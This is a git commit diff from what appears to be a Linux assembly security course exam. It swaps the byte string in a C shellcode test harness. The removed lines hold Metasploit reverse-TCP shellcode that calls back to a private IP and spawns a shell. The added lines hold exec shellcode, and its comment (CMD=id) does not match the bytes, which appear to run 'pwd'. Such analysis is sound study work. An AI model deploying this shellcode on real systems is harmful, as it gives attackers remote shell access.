d67b67a315e93331b6dcb5c2558e6be38cb14b8c
Oleg Boytsev <o_boytsev@wargaming.net>
2014-06-12 03:52:19 -0400

    SLAE EXAM

--- 5_assignment/exec.c
+++ 5_assignment/exec.c
@@ -1,6 +1,6 @@
-// Linux/x86/shell_reverse_tcp shellcode analysis
-// msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.91.129 C
-// Filename: checker2.c
+// Linux/x86/exec shellcode analysis
+// msfpayload linux/x86/exec CMD=id C
+// Filename: exec.c
 // Author: Oleg Boytsev
 // License http://creativecommons.org/licenses/by-sa/3.0/
 // Legitimate use and research only
@@ -8,16 +8,13 @@
 // but WITHOUT ANY WARRANTY; without even the implied warranty of
 // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 
-
 #include<stdio.h>
 #include<string.h>
 
 unsigned char shellcode[] =
-"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
-"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x5b\x81\x68"
-"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
-"\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
-"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x04\x00\x00\x00\x70"
+"\x77\x64\x00\x57\x53\x89\xe1\xcd\x80";
 main()
 {
         printf("Shellcode Length: %d\n",strlen(shellcode));
